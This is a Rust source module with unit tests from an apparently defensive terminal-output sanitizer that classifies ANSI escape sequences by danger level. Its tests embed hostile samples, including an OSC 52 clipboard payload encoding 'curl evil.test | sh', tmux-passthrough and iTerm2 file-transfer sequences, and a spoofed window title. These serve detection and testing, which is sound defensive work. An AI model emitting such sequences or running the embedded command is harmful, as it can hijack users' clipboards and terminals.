//! Semantic classification of parsed tokens.
//!
//! Every token gets a [`Class`] (what the sequence *does*, the unit the
//! policy engine reasons about) and a [`Severity`] (how dangerous it is when
//! it arrives in untrusted output, the unit `scan --fail-on` gates on).
//! Classification is purely descriptive: it never decides keep-vs-strip —
//! that is [`crate::policy`]'s job.

use crate::parser::{MalformedReason, StrKind, Token};

/// Semantic class of a sequence. These are the names accepted by
/// `--allow` / `--deny` on the command line.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Class {
    /// Select Graphic Rendition: colors, bold, underline... (`CSI ... m`).
    Sgr,
    /// Cursor positioning and save/restore (`CSI A/B/C/D/H...`, `ESC 7/8`).
    Cursor,
    /// Erase, scroll, and insert/delete operations (`CSI J/K/L/M/P/S/T/X/@`).
    Screen,
    /// Terminal mode switches: alt screen, mouse tracking, bracketed paste,
    /// keypad modes (`CSI ... h/l`, `ESC = / >`).
    Mode,
    /// Window/icon title changes (`OSC 0/1/2`, title stack via `CSI 22/23 t`).
    Title,
    /// Clipboard read/write (`OSC 52`).
    Clipboard,
    /// Color palette and default-color changes (`OSC 4/10..19/104/110..119`).
    Palette,
    /// Hyperlinks (`OSC 8`).
    Hyperlink,
    /// Anything that makes the terminal *answer* on stdin: DA, DSR, window
    /// ops, ENQ answerback — the raw material of response-injection attacks.
    Query,
    /// String-payload channels: DCS, APC, PM, SOS (DECRQSS, sixel, kitty
    /// graphics, tmux passthrough, XTGETTCAP...).
    Dcs,
    /// Character-set designation and shifts (`ESC ( 0`, SI/SO, SS2/SS3...).
    Charset,
    /// Full or soft terminal reset (`ESC c`, `CSI ! p`).
    Reset,
    /// Bare C0 control bytes and DEL (BEL, BS, VT, FF...). `\n`, `\t` and
    /// `\r` belong here too but are hardwired safe in the sanitizer.
    Control,
    /// Standalone raw 8-bit C1 control bytes.
    C1,
    /// Well-formed but unrecognized sequences.
    Unknown,
    /// Truncated, spliced, or oversized sequences. Never re-emittable.
    Malformed,
}

/// All classes, in display order for `seqsafe classes` and reports.
pub const ALL_CLASSES: [Class; 16] = [
    Class::Sgr,
    Class::Hyperlink,
    Class::Cursor,
    Class::Screen,
    Class::Mode,
    Class::Title,
    Class::Clipboard,
    Class::Palette,
    Class::Query,
    Class::Dcs,
    Class::Charset,
    Class::Reset,
    Class::Control,
    Class::C1,
    Class::Unknown,
    Class::Malformed,
];

impl Class {
    /// Stable lowercase name used on the CLI and in JSON output.
    pub fn name(self) -> &'static str {
        match self {
            Class::Sgr => "sgr",
            Class::Cursor => "cursor",
            Class::Screen => "screen",
            Class::Mode => "mode",
            Class::Title => "title",
            Class::Clipboard => "clipboard",
            Class::Palette => "palette",
            Class::Hyperlink => "hyperlink",
            Class::Query => "query",
            Class::Dcs => "dcs",
            Class::Charset => "charset",
            Class::Reset => "reset",
            Class::Control => "control",
            Class::C1 => "c1",
            Class::Unknown => "unknown",
            Class::Malformed => "malformed",
        }
    }

    /// Parse a CLI class name.
    pub fn from_name(name: &str) -> Option<Class> {
        ALL_CLASSES.iter().copied().find(|c| c.name() == name)
    }

    /// One-line description shown by `seqsafe classes` and `explain`.
    pub fn describe(self) -> &'static str {
        match self {
            Class::Sgr => "colors and text styling (CSI ... m); the thing worth keeping",
            Class::Cursor => "cursor movement lets output overwrite earlier, already-trusted lines",
            Class::Screen => "erase/scroll/insert can hide evidence or displace what you just read",
            Class::Mode => "alt screen, mouse tracking and bracketed-paste switches change how the terminal behaves after the output ends",
            Class::Title => "window titles persist after the output and are spoofing bait for humans and prompts",
            Class::Clipboard => "OSC 52 writes (or reads) your clipboard; the classic paste-a-command attack",
            Class::Palette => "palette changes can render later text invisible (foreground = background)",
            Class::Hyperlink => "OSC 8 hyperlinks; safe schemes are kept, anything else is stripped",
            Class::Query => "device queries make the terminal type an answer into stdin, which the foreground program reads as input",
            Class::Dcs => "DCS/APC/PM/SOS payload channels: DECRQSS, XTGETTCAP, graphics, tmux passthrough — high-bandwidth and terminal-specific",
            Class::Charset => "charset designation remaps glyphs so the bytes you audit are not the glyphs you see",
            Class::Reset => "full/soft resets wipe terminal state including your scrollback settings",
            Class::Control => "bare control bytes: BEL rings, BS overwrites, VT/FF move vertically",
            Class::C1 => "raw 8-bit C1 controls; legitimate UTF-8 output never contains them standalone",
            Class::Unknown => "well-formed sequences seqsafe does not recognize; stripped on principle",
            Class::Malformed => "truncated/spliced/oversized sequences; always stripped, cannot be allowed",
        }
    }
}

/// How dangerous a finding is. Ordered so `>=` comparisons gate correctly.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Harmless; kept sequences and plain whitespace.
    None,
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    pub fn name(self) -> &'static str {
        match self {
            Severity::None => "none",
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }

    /// Parse a `--fail-on` level. `any` means "any finding at all".
    pub fn from_name(name: &str) -> Option<Severity> {
        match name {
            "low" | "any" => Some(Severity::Low),
            "medium" => Some(Severity::Medium),
            "high" => Some(Severity::High),
            "critical" => Some(Severity::Critical),
            _ => None,
        }
    }
}

/// The classifier's judgement on one token.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Verdict {
    pub class: Class,
    pub severity: Severity,
    /// Short stable identifier for *what* the sequence is (`osc52-write`,
    /// `alt-screen`, `decrqss`...), more specific than the class.
    pub label: &'static str,
}

fn v(class: Class, severity: Severity, label: &'static str) -> Verdict {
    Verdict {
        class,
        severity,
        label,
    }
}

/// Classify one token. [`Token::Text`] is not classified (it is always kept).
pub fn classify(token: &Token) -> Verdict {
    match token {
        Token::Text(_) => v(Class::Control, Severity::None, "text"),
        Token::Control(b) => classify_control(*b),
        Token::C1(_) => v(Class::C1, Severity::High, "c1-control"),
        Token::Csi {
            params,
            intermediates,
            final_byte,
            ..
        } => classify_csi(params, intermediates, *final_byte),
        Token::Esc {
            intermediates,
            final_byte,
            ..
        } => classify_esc(intermediates, *final_byte),
        Token::Str {
            kind,
            payload,
            overlong,
            ..
        } => {
            if *overlong {
                // An 8 KiB+ string payload is not styling; treat as hostile.
                v(Class::Malformed, Severity::High, "oversized-string")
            } else {
                classify_str(*kind, payload)
            }
        }
        Token::Malformed { reason, .. } => classify_malformed(*reason),
    }
}

fn classify_control(b: u8) -> Verdict {
    match b {
        b'\n' | b'\t' | b'\r' => v(Class::Control, Severity::None, "whitespace"),
        0x07 => v(Class::Control, Severity::Low, "bell"),
        0x08 => v(Class::Control, Severity::Medium, "backspace"),
        0x0B => v(Class::Control, Severity::Medium, "vertical-tab"),
        0x0C => v(Class::Control, Severity::Medium, "form-feed"),
        // ENQ triggers the answerback string: the terminal types into stdin.
        0x05 => v(Class::Query, Severity::High, "enquiry"),
        // SO/SI switch between G0/G1 charsets: glyph remapping.
        0x0E => v(Class::Charset, Severity::High, "shift-out"),
        0x0F => v(Class::Charset, Severity::Medium, "shift-in"),
        0x7F => v(Class::Control, Severity::Medium, "delete"),
        _ => v(Class::Control, Severity::Low, "c0-control"),
    }
}

fn classify_csi(params: &[u8], intermediates: &[u8], final_byte: u8) -> Verdict {
    if !intermediates.is_empty() {
        return match (intermediates, final_byte) {
            (b"!", b'p') => v(Class::Reset, Severity::High, "soft-reset"),
            (b" ", b'q') => v(Class::Mode, Severity::Low, "cursor-style"),
            _ => v(Class::Unknown, Severity::Medium, "csi-unknown"),
        };
    }
    match final_byte {
        b'm' => {
            if valid_sgr_params(params) {
                v(Class::Sgr, Severity::None, "sgr")
            } else {
                // `CSI > 4 m` and friends are xterm key-modifier settings.
                v(Class::Mode, Severity::Medium, "private-sgr")
            }
        }
        b'A' | b'B' | b'C' | b'D' | b'E' | b'F' | b'G' | b'H' | b'a' | b'd' | b'e' | b'f'
        | b'`' => v(Class::Cursor, Severity::Medium, "cursor-move"),
        b's' | b'u' => v(Class::Cursor, Severity::Medium, "cursor-save-restore"),
        b'J' => v(Class::Screen, Severity::Medium, "erase-display"),
        b'K' => v(Class::Screen, Severity::Medium, "erase-line"),
        b'L' | b'M' | b'P' | b'X' | b'@' | b'b' => v(Class::Screen, Severity::Medium, "edit-line"),
        b'S' | b'T' => v(Class::Screen, Severity::Medium, "scroll"),
        b'r' => v(Class::Screen, Severity::Medium, "scroll-region"),
        b'h' | b'l' => classify_mode(params, final_byte),
        b'n' => v(Class::Query, Severity::High, "device-status-report"),
        b'c' => v(Class::Query, Severity::High, "device-attributes"),
        b'x' => v(Class::Query, Severity::High, "terminal-parameters"),
        b't' => classify_window_op(params),
        _ => v(Class::Unknown, Severity::Medium, "csi-unknown"),
    }
}

/// SGR parameters may contain only digits, `;` and `:` (ISO subparams).
fn valid_sgr_params(params: &[u8]) -> bool {
    params
        .iter()
        .all(|b| b.is_ascii_digit() || *b == b';' || *b == b':')
}

fn classify_mode(params: &[u8], final_byte: u8) -> Verdict {
    let set = final_byte == b'h';
    if let Some(rest) = params.strip_prefix(b"?") {
        // DEC private modes: pick out the ones users actually get bitten by.
        let label = match leading_number(rest) {
            Some(47) | Some(1047) | Some(1049) => "alt-screen",
            Some(n) if (1000..=1016).contains(&n) => "mouse-tracking",
            Some(2004) => "bracketed-paste",
            Some(25) => "cursor-visibility",
            Some(2026) => "sync-update",
            _ => {
                if set {
                    "private-mode-set"
                } else {
                    "private-mode-reset"
                }
            }
        };
        return v(Class::Mode, Severity::High, label);
    }
    v(Class::Mode, Severity::Medium, "ansi-mode")
}

fn classify_window_op(params: &[u8]) -> Verdict {
    match leading_number(params) {
        // Title stack push/pop manipulates the window title like OSC 0/2.
        Some(22) | Some(23) => v(Class::Title, Severity::High, "title-stack"),
        // 11/13/14/18/19/20/21 make the terminal report geometry or title
        // back on stdin; the title report (21) is a proven injection vector.
        Some(11) | Some(13) | Some(14) | Some(18) | Some(19) | Some(20) | Some(21) => {
            v(Class::Query, Severity::High, "window-report")
        }
        // The rest move/resize/iconify the window.
        _ => v(Class::Query, Severity::High, "window-op"),
    }
}

fn classify_esc(intermediates: &[u8], final_byte: u8) -> Verdict {
    if !intermediates.is_empty() {
        return match intermediates[0] {
            // ESC ( ) * + - . / designate character sets: `ESC ( 0` turns
            // subsequent text into DEC line-drawing glyphs.
            b'(' | b')' | b'*' | b'+' | b'-' | b'.' | b'/' => {
                v(Class::Charset, Severity::High, "charset-designate")
            }
            b'%' => v(Class::Charset, Severity::High, "charset-select"),
            b'#' => v(Class::Screen, Severity::Medium, "dec-screen-test"),
            _ => v(Class::Unknown, Severity::Medium, "esc-unknown"),
        };
    }
    match final_byte {
        b'7' | b'8' => v(Class::Cursor, Severity::Medium, "cursor-save-restore"),
        b'D' | b'E' | b'M' => v(Class::Screen, Severity::Medium, "index"),
        b'c' => v(Class::Reset, Severity::High, "hard-reset"),
        b'=' | b'>' => v(Class::Mode, Severity::Medium, "keypad-mode"),
        b'N' | b'O' => v(Class::Charset, Severity::High, "single-shift"),
        b'n' | b'o' | b'|' | b'}' | b'~' => v(Class::Charset, Severity::High, "locking-shift"),
        b'H' => v(Class::Screen, Severity::Low, "tab-set"),
        b'Z' => v(Class::Query, Severity::High, "device-attributes"),
        b'\\' => v(Class::Unknown, Severity::Low, "stray-terminator"),
        _ => v(Class::Unknown, Severity::Medium, "esc-unknown"),
    }
}

fn classify_str(kind: StrKind, payload: &[u8]) -> Verdict {
    match kind {
        StrKind::Osc => classify_osc(payload),
        StrKind::Dcs => classify_dcs(payload),
        StrKind::Apc => v(Class::Dcs, Severity::High, "apc"),
        StrKind::Pm => v(Class::Dcs, Severity::High, "pm"),
        StrKind::Sos => v(Class::Dcs, Severity::High, "sos"),
    }
}

fn classify_osc(payload: &[u8]) -> Verdict {
    let (num, rest) = split_osc(payload);
    match num {
        Some(0) | Some(1) | Some(2) => v(Class::Title, Severity::High, "title-set"),
        Some(4) | Some(5) => v(Class::Palette, Severity::Medium, "palette-set"),
        Some(n) if (10..=19).contains(&n) => {
            if rest.split(|b| *b == b';').any(|part| part == b"?") {
                // `OSC 10 ; ? ST` asks the terminal to report the color.
                v(Class::Query, Severity::High, "color-query")
            } else {
                v(Class::Palette, Severity::Medium, "default-colors")
            }
        }
        Some(104) | Some(105) => v(Class::Palette, Severity::Medium, "palette-reset"),
        Some(n) if (110..=119).contains(&n) => {
            v(Class::Palette, Severity::Medium, "default-colors-reset")
        }
        Some(8) => v(Class::Hyperlink, Severity::None, "hyperlink"),
        Some(52) => {
            if rest.split(|b| *b == b';').nth(1) == Some(b"?") {
                // `OSC 52 ; c ; ?` pastes the clipboard back on stdin.
                v(Class::Clipboard, Severity::Critical, "clipboard-read")
            } else {
                v(Class::Clipboard, Severity::Critical, "clipboard-write")
            }
        }
        Some(7) => v(Class::Unknown, Severity::Low, "cwd-report"),
        Some(9) | Some(99) | Some(777) => {
            v(Class::Unknown, Severity::Medium, "desktop-notification")
        }
        Some(133) => v(Class::Unknown, Severity::Low, "semantic-prompt"),
        Some(22) => v(Class::Unknown, Severity::Low, "pointer-shape"),
        // iTerm2's proprietary channel includes file download/upload.
        Some(1337) => v(Class::Dcs, Severity::Critical, "iterm2-proprietary"),
        _ => v(Class::Unknown, Severity::Medium, "osc-unknown"),
    }
}

fn classify_dcs(payload: &[u8]) -> Verdict {
    if payload.starts_with(b"$q") {
        // DECRQSS: the terminal echoes a status string — and lenient
        // terminals have echoed attacker-chosen bytes here (CVE-class bug).
        v(Class::Dcs, Severity::Critical, "decrqss")
    } else if payload.starts_with(b"+q") {
        v(Class::Dcs, Severity::Critical, "xtgettcap")
    } else if payload.starts_with(b"tmux;") {
        // tmux passthrough wraps an inner sequence that escapes this filter.
        v(Class::Dcs, Severity::Critical, "tmux-passthrough")
    } else if payload.iter().take(8).any(|b| *b == b'q') {
        v(Class::Dcs, Severity::Medium, "sixel")
    } else {
        v(Class::Dcs, Severity::High, "dcs")
    }
}

fn classify_malformed(reason: MalformedReason) -> Verdict {
    let label = match reason {
        MalformedReason::Truncated => "truncated-sequence",
        MalformedReason::AbortedByControl => "spliced-sequence",
        MalformedReason::Oversized => "oversized-sequence",
        MalformedReason::BadByte => "corrupt-sequence",
    };
    v(Class::Malformed, Severity::Medium, label)
}

/// Split an OSC payload into its numeric selector and the rest after the
/// first `;`. Returns `None` for a non-numeric or empty selector.
pub fn split_osc(payload: &[u8]) -> (Option<u32>, &[u8]) {
    let sep = payload.iter().position(|b| *b == b';');
    let (head, rest) = match sep {
        Some(i) => (&payload[..i], &payload[i + 1..]),
        None => (payload, &payload[payload.len()..]),
    };
    (parse_number(head), rest)
}

fn parse_number(bytes: &[u8]) -> Option<u32> {
    if bytes.is_empty() || bytes.len() > 8 || !bytes.iter().all(u8::is_ascii_digit) {
        return None;
    }
    std::str::from_utf8(bytes).ok()?.parse().ok()
}

fn leading_number(params: &[u8]) -> Option<u32> {
    let end = params
        .iter()
        .position(|b| !b.is_ascii_digit())
        .unwrap_or(params.len());
    parse_number(&params[..end])
}

/// Extract the URI from an `OSC 8 ; params ; uri` payload, if present.
pub fn hyperlink_uri(payload: &[u8]) -> Option<&[u8]> {
    let rest = payload.strip_prefix(b"8;")?;
    let sep = rest.iter().position(|b| *b == b';')?;
    Some(&rest[sep + 1..])
}

#[cfg(test)]
mod tests {
    //! Classifier unit tests: each attack family maps to the right class,
    //! severity and label — this table is what the policy engine trusts.

    use super::*;
    use crate::parser::tokenize;

    fn verdict(input: &[u8]) -> Verdict {
        let toks = tokenize(input);
        assert_eq!(toks.len(), 1, "expected one token for {input:?}: {toks:?}");
        classify(&toks[0])
    }

    #[test]
    fn sgr_color_is_benign_including_colon_subparams() {
        let vd = verdict(b"\x1b[1;38;5;208m");
        assert_eq!(vd.class, Class::Sgr);
        assert_eq!(vd.severity, Severity::None);
        assert_eq!(verdict(b"\x1b[4:3m").class, Class::Sgr);
    }

    #[test]
    fn private_marker_disqualifies_sgr() {
        // `CSI > 4;2 m` is an xterm modifyOtherKeys setting, not styling.
        let vd = verdict(b"\x1b[>4;2m");
        assert_eq!(vd.class, Class::Mode);
        assert_eq!(vd.label, "private-sgr");
    }

    #[test]
    fn osc52_write_and_read_are_critical_clipboard() {
        let vd = verdict(b"\x1b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\x07");
        assert_eq!(vd.class, Class::Clipboard);
        assert_eq!(vd.severity, Severity::Critical);
        assert_eq!(vd.label, "clipboard-write");
        assert_eq!(verdict(b"\x1b]52;c;?\x07").label, "clipboard-read");
    }

    #[test]
    fn title_manipulation_is_high() {
        let vd = verdict(b"\x1b]0;you have been hacked\x07");
        assert_eq!(vd.class, Class::Title);
        assert_eq!(vd.severity, Severity::High);
        assert_eq!(verdict(b"\x1b[22;0t").label, "title-stack");
    }

    #[test]
    fn hyperlink_is_class_hyperlink() {
        let vd = verdict(b"\x1b]8;;https://example.test\x1b\\");
        assert_eq!(vd.class, Class::Hyperlink);
    }

    #[test]
    fn color_query_is_query_not_palette() {
        assert_eq!(verdict(b"\x1b]10;?\x07").class, Class::Query);
        assert_eq!(verdict(b"\x1b]11;#ff0000\x07").class, Class::Palette);
    }

    #[test]
    fn device_queries_and_enq_answerback_are_high_query() {
        for input in [&b"\x1b[c"[..], b"\x1b[6n", b"\x1b[x", b"\x1bZ", b"\x05"] {
            let vd = verdict(input);
            assert_eq!(vd.class, Class::Query, "{input:?}");
            assert_eq!(vd.severity, Severity::High, "{input:?}");
        }
        assert_eq!(verdict(b"\x1b[21t").label, "window-report");
    }

    #[test]
    fn alt_screen_and_mouse_modes_are_labelled() {
        assert_eq!(verdict(b"\x1b[?1049h").label, "alt-screen");
        assert_eq!(verdict(b"\x1b[?1003h").label, "mouse-tracking");
        assert_eq!(verdict(b"\x1b[?2004h").label, "bracketed-paste");
    }

    #[test]
    fn dcs_response_channels_are_critical() {
        assert_eq!(verdict(b"\x1bP$qm\x1b\\").severity, Severity::Critical);
        assert_eq!(verdict(b"\x1bP+q544e\x1b\\").label, "xtgettcap");
        let vd = verdict(b"\x1bPtmux;payload\x1b\\");
        assert_eq!(vd.label, "tmux-passthrough");
        assert_eq!(vd.severity, Severity::Critical);
        // The real-world variant with doubled inner ESCs splits into several
        // tokens in our parser; the leading DCS fragment must classify as
        // malformed so it is stripped no matter what.
        let toks = tokenize(b"\x1bPtmux;\x1b\x1b]52;c;evil\x07\x1b\\");
        assert_eq!(classify(&toks[0]).class, Class::Malformed);
    }

    #[test]
    fn charset_designation_is_high() {
        let vd = verdict(b"\x1b(0");
        assert_eq!(vd.class, Class::Charset);
        assert_eq!(vd.severity, Severity::High);
        assert_eq!(verdict(b"\x0e").class, Class::Charset);
    }

    #[test]
    fn hard_and_soft_reset_are_reset_class() {
        assert_eq!(verdict(b"\x1bc").label, "hard-reset");
        assert_eq!(verdict(b"\x1b[!p").label, "soft-reset");
    }

    #[test]
    fn iterm2_proprietary_osc_is_critical() {
        let vd = verdict(b"\x1b]1337;File=name=eC5zaA==:cGF5bG9hZA==\x07");
        assert_eq!(vd.severity, Severity::Critical);
        assert_eq!(vd.label, "iterm2-proprietary");
    }

    #[test]
    fn unknown_osc_number_is_medium_unknown() {
        let vd = verdict(b"\x1b]666;stuff\x07");
        assert_eq!(vd.class, Class::Unknown);
        assert_eq!(vd.severity, Severity::Medium);
    }

    #[test]
    fn whitespace_controls_are_severity_none() {
        for b in [b'\n', b'\t', b'\r'] {
            assert_eq!(classify_control(b).severity, Severity::None);
        }
        assert_eq!(classify_control(0x08).severity, Severity::Medium);
    }

    #[test]
    fn hyperlink_uri_extraction() {
        assert_eq!(
            hyperlink_uri(b"8;;https://example.test/a;b"),
            Some(&b"https://example.test/a;b"[..])
        );
        assert_eq!(
            hyperlink_uri(b"8;id=1;mailto:a@example.test"),
            Some(&b"mailto:a@example.test"[..])
        );
        assert_eq!(hyperlink_uri(b"8;noseparator"), None);
        assert_eq!(hyperlink_uri(b"52;c;x"), None);
    }

    #[test]
    fn class_names_round_trip() {
        for c in ALL_CLASSES {
            assert_eq!(Class::from_name(c.name()), Some(c));
        }
        assert_eq!(Class::from_name("bogus"), None);
    }

    #[test]
    fn severity_ordering_gates_correctly() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
        assert!(Severity::Low > Severity::None);
        assert_eq!(Severity::from_name("any"), Some(Severity::Low));
        assert_eq!(Severity::from_name("nope"), None);
    }
}
